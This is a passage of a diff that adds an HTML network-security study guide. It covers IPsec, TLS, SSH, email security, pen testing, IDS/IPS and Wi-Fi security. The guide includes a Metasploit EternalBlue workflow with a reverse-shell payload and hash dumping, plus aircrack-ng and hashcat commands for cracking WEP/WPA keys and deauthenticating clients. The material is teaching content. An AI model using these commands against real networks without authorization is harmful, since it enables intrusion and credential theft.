+        <li><strong>Anti-replay:</strong> Sequence numbers prevent replay attacks</li>
+        <li><strong>Access Control:</strong> Security Policy Database (SPD) determines which traffic gets IPsec treatment</li>
+      </ul>
+      <h4>Security Policy Database (SPD)</h4>
+      <p>Every IPsec implementation has an SPD that maps selectors (src/dst IP, protocol, ports) to one of three actions:</p>
+      <ul>
+        <li><strong>DISCARD:</strong> Drop the traffic</li>
+        <li><strong>BYPASS:</strong> Forward without IPsec processing</li>
+        <li><strong>PROTECT:</strong> Apply IPsec (referenced SA specifies how)</li>
+      </ul>
+      <h4>Security Association (SA)</h4>
+      <p>An SA is a one-way logical connection that defines the parameters for securing traffic: algorithm, keys, lifetime. Identified by a <strong>triple: (SPI, Destination IP, Protocol)</strong>. For bidirectional communication, two SAs are needed.</p>
+      <ul>
+        <li>Stored in the <strong>Security Association Database (SAD)</strong></li>
+        <li><strong>SPI (Security Parameter Index):</strong> 32-bit value in each packet header identifying the SA</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🔐</div>
+      <h3>AH vs ESP — Authentication &amp; Encapsulation</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Authentication Header (AH) — Protocol 51</h4>
+      <p>AH provides authentication and integrity for the entire IP packet (including the IP header), but provides <strong>NO confidentiality</strong> (no encryption). It uses HMAC (e.g. HMAC-SHA256).</p>
+      <div class="callout warn"><span class="callout-icon">⚠</span><div>AH is incompatible with NAT because NAT changes the IP header, breaking AH's integrity check. Rarely used today.</div></div>
+
+      <h4>Encapsulating Security Payload (ESP) — Protocol 50</h4>
+      <p>ESP provides <strong>confidentiality (encryption)</strong>, authentication, integrity, and anti-replay. It protects only the payload (not the outer IP header in tunnel mode).</p>
+
+      <table class="cmp-table">
+        <tr><th>Feature</th><th>AH</th><th>ESP</th><th>ESP + AH</th></tr>
+        <tr><td>Confidentiality</td><td>❌</td><td>✅</td><td>✅</td></tr>
+        <tr><td>Authentication</td><td>✅ (incl. IP hdr)</td><td>✅ (payload only)</td><td>✅ (full packet)</td></tr>
+        <tr><td>Integrity</td><td>✅</td><td>✅</td><td>✅</td></tr>
+        <tr><td>Anti-replay</td><td>✅</td><td>✅</td><td>✅</td></tr>
+        <tr><td>NAT compatible</td><td>❌</td><td>✅ (NAT-T)</td><td>✅</td></tr>
+        <tr><td>IP Protocol #</td><td>51</td><td>50</td><td>Both</td></tr>
+      </table>
+
+      <h4>ESP Packet Structure</h4>
+      <pre><code>[IP Header][ESP Header: SPI + Seq#][Encrypted: Payload + Padding + Pad Len + Next Hdr][ESP Auth Trailer: ICV]</code></pre>
+
+      <h4>Common Algorithms</h4>
+      <ul>
+        <li><strong>Encryption:</strong> AES-CBC, AES-GCM, 3DES (legacy)</li>
+        <li><strong>Integrity/Auth:</strong> HMAC-SHA256, HMAC-SHA384, AES-GMAC</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🚇</div>
+      <h3>Transport Mode vs Tunnel Mode</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Transport Mode</h4>
+      <p>The original IP header is preserved. IPsec headers are inserted between the IP header and the transport layer (TCP/UDP) payload. Used for <strong>host-to-host</strong> communication.</p>
+      <pre><code>Transport Mode:
+[Original IP Hdr][IPsec Header][TCP/UDP][Data]</code></pre>
+      <ul>
+        <li>Lower overhead (no extra IP header)</li>
+        <li>Endpoints must be the IPsec gateways (exposes real IPs)</li>
+        <li>Typical use: Remote host to server, L2TP/IPsec client VPN</li>
+      </ul>
+
+      <h4>Tunnel Mode</h4>
+      <p>The entire original IP packet is encapsulated inside a new IP packet with a new outer IP header. The original packet (including its IP header) is protected. Used for <strong>gateway-to-gateway (site-to-site VPN)</strong>.</p>
+      <pre><code>Tunnel Mode:
+[New IP Hdr (gateway IPs)][IPsec Header][Original IP Hdr][TCP/UDP][Data]</code></pre>
+      <ul>
+        <li>Hides the original source/destination IPs (extra privacy)</li>
+        <li>Supports NAT-T (NAT Traversal) with UDP port 4500</li>
+        <li>More overhead due to extra IP header</li>
+        <li>Used in site-to-site VPNs between routers/firewalls</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🤝</div>
+      <h3>Internet Key Exchange (IKE)</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Purpose</h4>
+      <p>IKE (defined in RFC 7296, IKEv2) automates the negotiation of SAs and management of cryptographic keys. Without IKE, all keys and parameters would need to be manually configured.</p>
+
+      <h4>IKEv1 — Two Phases</h4>
+      <ul>
+        <li><strong>Phase 1 (IKE SA):</strong> Establishes a secure, authenticated channel (ISAKMP SA) used to protect Phase 2. Two modes:
+          <ul>
+            <li><em>Main Mode:</em> 6 messages, protects identity, more secure</li>
+            <li><em>Aggressive Mode:</em> 3 messages, faster but exposes identity hash</li>
+          </ul>
+        </li>
+        <li><strong>Phase 2 (IPsec SA):</strong> Uses the IKE SA to negotiate IPsec SAs (Quick Mode, 3 messages)</li>
+      </ul>
+
+      <h4>IKEv2 (Modern — Preferred)</h4>
+      <p>Replaces IKEv1 with a simpler, more efficient exchange (4 messages for initial setup). Supports MOBIKE (mobility), EAP authentication, and has built-in NAT traversal.</p>
+
+      <h4>Authentication Methods</h4>
+      <ul>
+        <li><strong>Pre-Shared Key (PSK):</strong> Simple but requires secure out-of-band key distribution</li>
+        <li><strong>RSA Digital Signatures:</strong> Uses PKI certificates — more scalable</li>
+        <li><strong>EAP (IKEv2 only):</strong> Allows username/password or other EAP methods</li>
+      </ul>
+
+      <h4>Key Exchange — Diffie-Hellman (DH)</h4>
+      <p>IKE uses DH to establish a shared secret over an insecure channel without transmitting the secret itself. The DH group determines key strength (Group 14 = 2048-bit, Group 19 = 256-bit ECDH recommended).</p>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🔗</div>
+      <h3>Virtual Private Networks (VPN)</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>VPN Types</h4>
+      <table class="cmp-table">
+        <tr><th>Type</th><th>Protocol</th><th>Use Case</th></tr>
+        <tr><td>Site-to-Site IPsec</td><td>IPsec/IKE</td><td>Connect two office networks</td></tr>
+        <tr><td>Remote Access (Client VPN)</td><td>IPsec/L2TP, SSL/TLS</td><td>Remote employees</td></tr>
+        <tr><td>SSL VPN</td><td>TLS (HTTPS)</td><td>Clientless browser-based access</td></tr>
+        <tr><td>MPLS VPN</td><td>MPLS labels</td><td>Provider-managed enterprise WAN</td></tr>
+      </table>
+      <h4>IPsec VPN (Site-to-Site)</h4>
+      <p>Two gateway routers/firewalls negotiate an IKE tunnel in <strong>tunnel mode with ESP</strong>. Traffic between the two sites is encrypted and encapsulated. The VPN gateway decapsulates and forwards to the internal network.</p>
+      <div class="callout info"><span class="callout-icon">ℹ</span><div><strong>Split tunnelling:</strong> Only traffic destined for the remote network goes through the VPN; internet traffic exits locally. Full tunnelling forces ALL traffic through the VPN.</div></div>
+      <h4>Combining SAs (SA Bundles)</h4>
+      <p>Multiple SAs can be combined in sequence, known as an <strong>SA bundle</strong>. For example, applying AH then ESP, or nesting tunnel-mode inside transport-mode for extra protection between intermediate gateways.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════
+     UNIT 3 — TRANSPORT-LEVEL & EMAIL SECURITY
+═══════════════════════════════════════════════ -->
+<section class="unit" id="u3">
+  <p class="unit-number">// Unit 03</p>
+  <h2>Transport-Level &amp; Email Security</h2>
+  <p class="unit-desc">SSL/TLS, HTTPS, SSH, PGP, S/MIME, and DKIM.</p>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🔒</div>
+      <h3>SSL / TLS — Secure Sockets Layer &amp; Transport Layer Security</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Overview</h4>
+      <p>SSL was developed by Netscape in 1994. TLS is its successor (IETF standardised). Both provide a <strong>secure channel between two communicating parties</strong> at the transport layer, sitting between TCP and the application layer.</p>
+      <table class="cmp-table">
+        <tr><th>Version</th><th>Status</th><th>Notes</th></tr>
+        <tr><td>SSL 2.0 / 3.0</td><td>Deprecated (broken)</td><td>POODLE, DROWN attacks</td></tr>
+        <tr><td>TLS 1.0 / 1.1</td><td>Deprecated (2021)</td><td>BEAST, POODLE</td></tr>
+        <tr><td>TLS 1.2</td><td>Widely used</td><td>Supports AES-GCM</td></tr>
+        <tr><td>TLS 1.3</td><td>Current (RFC 8446)</td><td>Faster handshake, forward secrecy mandatory</td></tr>
+      </table>
+
+      <h4>TLS Architecture — Sub-protocols</h4>
+      <ul>
+        <li><strong>Handshake Protocol:</strong> Negotiates algorithms, authenticates server (and optionally client), establishes session keys</li>
+        <li><strong>Record Protocol:</strong> Fragments, compresses, MACs, and encrypts application data</li>
+        <li><strong>Alert Protocol:</strong> Communicates warnings and errors (e.g. certificate expired)</li>
+        <li><strong>Change Cipher Spec:</strong> Signals switch to negotiated cipher suite (simplified/removed in TLS 1.3)</li>
+      </ul>
+
+      <h4>TLS 1.3 Handshake (Simplified)</h4>
+      <pre><code>Client → Server: ClientHello (supported ciphers, key_share)
+Server → Client: ServerHello + Certificate + CertificateVerify + Finished
+Client → Server: Finished
+[Both sides derive session keys from shared secret — 1-RTT]
+Application data can flow immediately.</code></pre>
+
+      <h4>Key Security Features</h4>
+      <ul>
+        <li><strong>Certificate-based authentication:</strong> Server certificate signed by a trusted CA</li>
+        <li><strong>Perfect Forward Secrecy (PFS):</strong> Ephemeral DH keys — compromise of long-term key doesn't expose past sessions</li>
+        <li><strong>AEAD ciphers:</strong> TLS 1.3 mandates authenticated encryption (AES-GCM, ChaCha20-Poly1305)</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🌍</div>
+      <h3>HTTPS Standard</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>What is HTTPS?</h4>
+      <p>HTTPS = HTTP over TLS. It encrypts the entire HTTP exchange, providing confidentiality, integrity, and server authentication. Default port: <strong>443</strong>.</p>
+      <h4>How it Works</h4>
+      <ol>
+        <li>TCP connection established on port 443</li>
+        <li>TLS handshake: server presents certificate, keys are exchanged</li>
+        <li>HTTP requests/responses are sent encrypted inside TLS records</li>
+      </ol>
+      <h4>HSTS (HTTP Strict Transport Security)</h4>
+      <p>Server sends <code>Strict-Transport-Security</code> header, instructing browsers to only use HTTPS for future connections, preventing SSL stripping attacks.</p>
+      <h4>Certificate Validation</h4>
+      <ul>
+        <li><strong>DV (Domain Validated):</strong> Proves control of domain only</li>
+        <li><strong>OV (Organisation Validated):</strong> Validates organisation identity</li>
+        <li><strong>EV (Extended Validation):</strong> Highest assurance — shows organisation name in browser</li>
+      </ul>
+      <h4>Attacks on HTTPS</h4>
+      <ul>
+        <li><strong>SSL Stripping (sslstrip):</strong> Downgrades HTTPS to HTTP in a MITM attack</li>
+        <li><strong>Certificate pinning bypass:</strong> Attacker installs custom CA to intercept TLS</li>
+        <li><strong>BEAST, CRIME, BREACH:</strong> Attacks exploiting TLS implementation weaknesses</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🖥️</div>
+      <h3>Secure Shell (SSH)</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Overview</h4>
+      <p>SSH (RFC 4251–4254) provides a secure encrypted channel for remote login, command execution, and file transfer. Replaces insecure: Telnet (23), rsh, rlogin, FTP. Default port: <strong>22</strong>.</p>
+
+      <h4>SSH Architecture — Three Layers</h4>
+      <ul>
+        <li><strong>Transport Layer Protocol:</strong> Server authentication, encryption, integrity, compression. Uses DH for key exchange. Provides a secure channel.</li>
+        <li><strong>User Authentication Protocol:</strong> Authenticates the client to the server (password, public key, GSSAPI)</li>
+        <li><strong>Connection Protocol:</strong> Multiplexes the secure channel into multiple logical channels (shell sessions, port forwarding, SFTP)</li>
+      </ul>
+
+      <h4>Authentication Methods</h4>
+      <ul>
+        <li><strong>Password:</strong> Sent encrypted over the secure channel</li>
+        <li><strong>Public Key (preferred):</strong> Client has a key pair; server stores the public key in <code>~/.ssh/authorized_keys</code>; client proves possession of private key via digital signature</li>
+        <li><strong>Host-based:</strong> Based on the client host's identity</li>
+      </ul>
+
+      <h4>SSH Features</h4>
+      <ul>
+        <li><strong>Port Forwarding / Tunnelling:</strong> Forward local ports through SSH to bypass firewalls</li>
+        <li><strong>SFTP/SCP:</strong> Secure file transfer over SSH</li>
+        <li><strong>Jump Host (ProxyJump):</strong> Hop through an intermediate server</li>
+      </ul>
+      <div class="callout tip"><span class="callout-icon">✅</span><div>Always disable password authentication in favour of public-key auth, disable root login, and run SSH on a non-standard port as additional hardening.</div></div>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">✉️</div>
+      <h3>Pretty Good Privacy (PGP)</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Overview</h4>
+      <p>PGP (Phil Zimmermann, 1991) provides email encryption and digital signatures using a <strong>Web of Trust</strong> model (no central CA — users vouch for each other's keys). OpenPGP is the IETF standard (RFC 4880).</p>
+      <h4>How PGP Encrypts a Message</h4>
+      <ol>
+        <li>Generate a random <strong>session key</strong> (symmetric, e.g. AES-256)</li>
+        <li>Encrypt the message with the session key</li>
+        <li>Encrypt the session key with the <strong>recipient's RSA/ECDH public key</strong></li>
+        <li>Send both encrypted message + encrypted session key</li>
+      </ol>
+      <h4>How PGP Signs a Message</h4>
+      <ol>
+        <li>Hash the message (SHA-256)</li>
+        <li>Encrypt the hash with the <strong>sender's private key</strong> → digital signature</li>
+        <li>Recipient verifies by decrypting the signature with the sender's public key and comparing hashes</li>
+      </ol>
+      <h4>Key Management</h4>
+      <p>PGP uses <strong>key rings</strong> (public keyring and private keyring). Keys are distributed via <strong>keyservers</strong> (e.g. keys.openpgp.org). Trust levels: unknown → undefined → marginal → full → ultimate.</p>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">📨</div>
+      <h3>S/MIME &amp; DKIM</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>S/MIME (Secure/Multipurpose Internet Mail Extensions)</h4>
+      <p>S/MIME (RFC 5751) adds email encryption and digital signatures using <strong>X.509 certificates</strong> (PKI-based, unlike PGP's web of trust). Widely supported in corporate email clients (Outlook, Apple Mail).</p>
+      <ul>
+        <li><strong>Encryption:</strong> Uses recipient's public key certificate to encrypt a session key → hybrid encryption</li>
+        <li><strong>Digital Signature:</strong> Uses sender's private key, provides non-repudiation</li>
+        <li><strong>Certificate obtained from:</strong> A trusted Certificate Authority (CA)</li>
+      </ul>
+
+      <h4>PGP vs S/MIME</h4>
+      <table class="cmp-table">
+        <tr><th>Feature</th><th>PGP/OpenPGP</th><th>S/MIME</th></tr>
+        <tr><td>Trust model</td><td>Web of Trust</td><td>PKI / CA hierarchy</td></tr>
+        <tr><td>Certificates</td><td>PGP key (self-signed ok)</td><td>X.509 from CA</td></tr>
+        <tr><td>Use case</td><td>Individual, technical users</td><td>Corporate environments</td></tr>
+        <tr><td>Key distribution</td><td>Keyservers, manual</td><td>CA-issued certs</td></tr>
+      </table>
+
+      <h4>DKIM (DomainKeys Identified Mail)</h4>
+      <p>DKIM (RFC 6376) allows email senders to digitally sign messages using a private key. The corresponding public key is published in DNS. Receiving mail servers verify the signature, proving the email originated from the claimed domain and was not modified in transit.</p>
+      <ul>
+        <li>Protects against email spoofing and tampering</li>
+        <li>Works alongside <strong>SPF</strong> (Sender Policy Framework) and <strong>DMARC</strong> for complete email authentication</li>
+        <li>The DKIM signature appears in the <code>DKIM-Signature</code> email header</li>
+      </ul>
+      <div class="callout info"><span class="callout-icon">ℹ</span><div><strong>SPF:</strong> Lists authorised mail servers for a domain in DNS. <strong>DMARC:</strong> Policy that ties SPF and DKIM together and specifies what to do on failure (none / quarantine / reject).</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════
+     UNIT 4 — PENETRATION TESTING
+═══════════════════════════════════════════════ -->
+<section class="unit" id="u4">
+  <p class="unit-number">// Unit 04</p>
+  <h2>Penetration Testing &amp; IDS/IPS</h2>
+  <p class="unit-desc">Pen-test methodology, Metasploit, Nessus, OpenVAS, firewalls, IDS/IPS types.</p>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🎯</div>
+      <h3>Penetration Testing — Methodology &amp; Phases</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>What is Penetration Testing?</h4>
+      <p>A pen test is an <strong>authorised, simulated cyberattack</strong> on a system to evaluate its security posture. It differs from vulnerability scanning in that a pen tester actively exploits vulnerabilities to demonstrate impact.</p>
+      <h4>Types of Pen Tests (by knowledge)</h4>
+      <table class="cmp-table">
+        <tr><th>Type</th><th>Attacker Knowledge</th><th>Simulates</th></tr>
+        <tr><td>Black Box</td><td>No prior knowledge</td><td>External attacker</td></tr>
+        <tr><td>White Box</td><td>Full access (code, architecture)</td><td>Insider / code review</td></tr>
+        <tr><td>Grey Box</td><td>Partial knowledge</td><td>Semi-insider, partner</td></tr>
+      </table>
+      <h4>Pen Test Phases (PTES Methodology)</h4>
+      <ol>
+        <li><strong>Pre-engagement:</strong> Scope definition, rules of engagement, legal authorisation</li>
+        <li><strong>Intelligence Gathering (Recon):</strong> Passive (OSINT) and active information gathering</li>
+        <li><strong>Threat Modelling:</strong> Identify most valuable targets and attack vectors</li>
+        <li><strong>Vulnerability Analysis:</strong> Identify weaknesses using automated scanners + manual analysis</li>
+        <li><strong>Exploitation:</strong> Actively exploit vulnerabilities using Metasploit, custom exploits</li>
+        <li><strong>Post-Exploitation:</strong> Privilege escalation, lateral movement, persistence, data exfiltration</li>
+        <li><strong>Reporting:</strong> Executive summary + technical findings + remediation recommendations</li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🗡️</div>
+      <h3>Metasploit Framework</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Architecture</h4>
+      <p>Metasploit is an open-source pen-testing framework (Rapid7). It provides a database of exploits, payloads, and auxiliary modules.</p>
+      <h4>Key Components</h4>
+      <ul>
+        <li><strong>Exploit:</strong> Code that takes advantage of a vulnerability (e.g. EternalBlue, MS17-010)</li>
+        <li><strong>Payload:</strong> Code executed after exploitation (e.g. Meterpreter, shell)</li>
+        <li><strong>Auxiliary:</strong> Scanners, fuzzers, sniffers (no payload needed)</li>
+        <li><strong>Post-modules:</strong> Post-exploitation actions (dump hashes, screenshot, pivot)</li>
+        <li><strong>Encoder:</strong> Obfuscates payload to evade AV detection</li>
+        <li><strong>Nop:</strong> No-operation sled used in buffer overflow exploits</li>
+      </ul>
+      <h4>Basic Workflow</h4>
+      <pre><code>msfconsole
+msf> search ms17_010
+msf> use exploit/windows/smb/ms17_010_eternalblue
+msf(ms17...)> set RHOSTS 192.168.1.10
+msf(ms17...)> set payload windows/x64/meterpreter/reverse_tcp
+msf(ms17...)> set LHOST 192.168.1.50
+msf(ms17...)> run
+[*] Meterpreter session 1 opened
+meterpreter> sysinfo
+meterpreter> hashdump</code></pre>
+      <h4>Meterpreter (Meta-Interpreter)</h4>
+      <p>Advanced in-memory payload that runs entirely in RAM — leaves minimal disk footprint. Provides: shell, file upload/download, keylogging, screenshot, webcam access, pivoting.</p>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🔍</div>
+      <h3>Intelligence Gathering, Port Scanning &amp; Vulnerability Scanning</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Intelligence Gathering (Reconnaissance)</h4>
+      <p><strong>Passive Recon (OSINT):</strong> Gathering info without touching the target. Tools: WHOIS, DNS lookups, Google dorking (<code>site:</code>, <code>filetype:</code>, <code>inurl:</code>), Shodan, theHarvester, Maltego.</p>
+      <p><strong>Active Recon:</strong> Directly probing the target (ping, port scans, banner grabbing). More likely to be detected.</p>
+
+      <h4>Port &amp; Network Scanning — Nmap</h4>
+      <pre><code>nmap -sV -sC -O -p- 192.168.1.1     # Full scan: version, scripts, OS
+nmap -sS 192.168.1.0/24              # SYN (stealth) scan
+nmap --script vuln 192.168.1.1       # Run vulnerability scripts
+nmap -sU -p 53,67,161 192.168.1.1   # UDP scan</code></pre>
+      <p><strong>Scan Types:</strong></p>
+      <table class="cmp-table">
+        <tr><th>Scan</th><th>Description</th><th>Stealth</th></tr>
+        <tr><td>TCP Connect (-sT)</td><td>Full 3-way handshake</td><td>Low</td></tr>
+        <tr><td>SYN Scan (-sS)</td><td>Half-open: SYN → RST</td><td>Medium</td></tr>
+        <tr><td>FIN/NULL/Xmas (-sF/-sN/-sX)</td><td>Send abnormal TCP flags</td><td>High</td></tr>
+        <tr><td>UDP Scan (-sU)</td><td>Slow; ICMP unreachable = closed</td><td>Medium</td></tr>
+      </table>
+
+      <h4>Vulnerability Scanning — Nessus &amp; OpenVAS</h4>
+      <p><strong>Nessus (Tenable):</strong> Commercial vulnerability scanner (free for personal use — Essentials). Identifies CVEs, misconfigurations, default passwords. Outputs severity-rated reports.</p>
+      <p><strong>OpenVAS (Greenbone):</strong> Open-source alternative to Nessus. Greenbone Vulnerability Manager (GVM) provides a web UI. Contains an extensive NVT (Network Vulnerability Tests) feed.</p>
+
+      <h4>SPARTA (now Spartan)</h4>
+      <p>Python GUI that automates recon and scanning. Integrates nmap, Nikto, Hydra, and other tools into a point-and-click interface. Useful for structured vulnerability assessment workflows.</p>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🧱</div>
+      <h3>Firewalls — Windows &amp; Linux</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Firewall Types</h4>
+      <table class="cmp-table">
+        <tr><th>Type</th><th>Inspects</th><th>Layer</th></tr>
+        <tr><td>Packet Filter</td><td>IP/TCP/UDP headers only</td><td>L3/L4</td></tr>
+        <tr><td>Stateful Inspection</td><td>Connection state table</td><td>L3/L4</td></tr>
+        <tr><td>Application (Proxy) / WAF</td><td>Application payload (HTTP, DNS)</td><td>L7</td></tr>
+        <tr><td>Next-Gen Firewall (NGFW)</td><td>DPI, IPS, App awareness</td><td>L3–L7</td></tr>
+      </table>
+      <h4>Windows Firewall (Windows Defender Firewall)</h4>
+      <p>Host-based stateful firewall, managed via GUI or <code>netsh advfirewall</code> / PowerShell. Three profiles: Domain, Private, Public.</p>
+      <pre><code># Allow inbound SSH (PowerShell)
+New-NetFirewallRule -DisplayName "SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow</code></pre>
+      <h4>Linux Firewall — iptables &amp; nftables</h4>
+      <p><code>iptables</code> uses tables (filter, nat, mangle) and chains (INPUT, OUTPUT, FORWARD). <code>nftables</code> is the modern successor. <code>ufw</code> (Uncomplicated Firewall) provides a simplified interface on Ubuntu.</p>
+      <pre><code># Block all inbound; allow SSH, HTTP, HTTPS (ufw)
+ufw default deny incoming
+ufw allow ssh
+ufw allow 80/tcp
+ufw allow 443/tcp
+ufw enable
+
+# iptables equivalent
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -P INPUT DROP</code></pre>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🚨</div>
+      <h3>IDS &amp; IPS — Types &amp; Detection Methods</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>IDS vs IPS</h4>
+      <table class="cmp-table">
+        <tr><th>Feature</th><th>IDS (Intrusion Detection)</th><th>IPS (Intrusion Prevention)</th></tr>
+        <tr><td>Position</td><td>Out-of-band (mirror/tap)</td><td>Inline (traffic passes through)</td></tr>
+        <tr><td>Action</td><td>Detect &amp; Alert only</td><td>Detect, Alert &amp; Block</td></tr>
+        <tr><td>Failure mode</td><td>Fail-open (no impact on traffic)</td><td>Fail-open or fail-closed</td></tr>
+        <tr><td>Latency</td><td>None (passive)</td><td>Adds processing latency</td></tr>
+      </table>
+
+      <h4>1. Signature-Based Detection</h4>
+      <p>Compares traffic against a database of known attack signatures (patterns). Fast and accurate for known threats, but <strong>cannot detect zero-day or unknown attacks</strong>. Requires constant signature updates.</p>
+      <div class="callout warn"><span class="callout-icon">⚠</span><div>Weakness: Attackers can modify attack to avoid matching signature (polymorphic malware).</div></div>
+
+      <h4>2. Anomaly-Based Detection</h4>
+      <p>Establishes a baseline of normal behaviour (traffic volume, protocol distribution, connection patterns). Any significant deviation triggers an alert. <strong>Can detect unknown/zero-day attacks</strong> but has higher false-positive rates during the learning phase.</p>
+
+      <h4>3. Policy-Based (Specification-Based) Detection</h4>
+      <p>Alerts based on violations of manually defined security policies (e.g. "no FTP from DMZ to internal network"). Very low false positives but requires extensive manual policy creation.</p>
+
+      <h4>4. Honeypot-Based Detection</h4>
+      <p>A <strong>honeypot</strong> is a decoy system designed to attract attackers. Any interaction with a honeypot is inherently suspicious (no legitimate user should access it). Provides early warning and intelligence on attacker techniques.</p>
+      <ul>
+        <li><strong>Low-interaction:</strong> Simulates services (e.g. Honeyd) — safer but less intelligence</li>
+        <li><strong>High-interaction:</strong> Real OS and services — richer data but higher risk of compromise</li>
+        <li><strong>Honeynet:</strong> Network of honeypots</li>
+      </ul>
+
+      <h4>Popular IDS/IPS Tools</h4>
+      <p><span class="tag tag-blue">Snort</span> <span class="tag tag-blue">Suricata</span> <span class="tag tag-blue">Zeek (Bro)</span> <span class="tag tag-orange">OSSEC</span> <span class="tag tag-green">Wazuh</span></p>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════
+     UNIT 5 — WIRELESS & SNIFFING
+═══════════════════════════════════════════════ -->
+<section class="unit" id="u5">
+  <p class="unit-number">// Unit 05</p>
+  <h2>Wireless Security &amp; Network Sniffing</h2>
+  <p class="unit-desc">WEP/WPA cracking, Evil Twin, Deauth attacks, Wireshark, MITM, DNS/ARP poisoning.</p>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">📶</div>
+      <h3>Wireless Encryption — WEP &amp; WPA/WPA2/WPA3</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>WEP (Wired Equivalent Privacy)</h4>
+      <p>WEP (IEEE 802.11, 1997) uses <strong>RC4 stream cipher</strong> with 40-bit or 104-bit keys and a 24-bit IV (Initialisation Vector). <strong>Completely broken</strong> — crackable in minutes.</p>
+      <ul>
+        <li>IV too short (24-bit): only 16 million possible values — IVs repeat frequently</li>
+        <li>RC4 key scheduling weakness: related-key attacks (FMS/KoreK/PTW)</li>
+        <li>No proper integrity protection (CRC-32 is not a MAC)</li>
+      </ul>
+      <h4>Cracking WEP</h4>
+      <pre><code># 1. Set adapter to monitor mode
+airmon-ng start wlan0
+
+# 2. Capture packets on target network
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# 3. Accelerate IV collection with ARP replay attack
+aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
+
+# 4. Crack the key (needs ~50,000+ IVs)
+aircrack-ng capture*.cap</code></pre>
+
+      <h4>WPA / WPA2</h4>
+      <p><strong>WPA</strong> (2003, interim fix): Uses TKIP (RC4-based, still vulnerable to some attacks). <strong>WPA2</strong> (802.11i): Uses <strong>AES-CCMP</strong> — currently secure against brute force if strong passphrase used.</p>
+
+      <h4>Cracking WPA/WPA2 (4-Way Handshake)</h4>
+      <p>The attacker captures the 4-way authentication handshake, then performs an offline dictionary/brute-force attack against the PBKDF2-derived PMK.</p>
+      <pre><code># Capture handshake
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+# Deauth a client to force re-auth
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+# Crack with wordlist
+aircrack-ng capture*.cap -w /usr/share/wordlists/rockyou.txt</code></pre>
+      <div class="callout tip"><span class="callout-icon">✅</span><div><strong>WPA3</strong> uses SAE (Simultaneous Authentication of Equals / Dragonfly handshake) — resistant to offline dictionary attacks and provides forward secrecy.</div></div>
+
+      <h4>PMKID Attack (hashcat)</h4>
+      <p>Doesn't require capturing the 4-way handshake — extracts the PMKID from a single EAPOL frame and cracks offline. More efficient than handshake capture.</p>
+      <pre><code>hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
+hcxpcapngtool -o hashes.22000 capture.pcapng
+hashcat -m 22000 hashes.22000 rockyou.txt</code></pre>
+    </div>
+  </div>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">😈</div>
+      <h3>Evil Twin Attack &amp; Deauthentication Attack</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Evil Twin (Rogue AP)</h4>
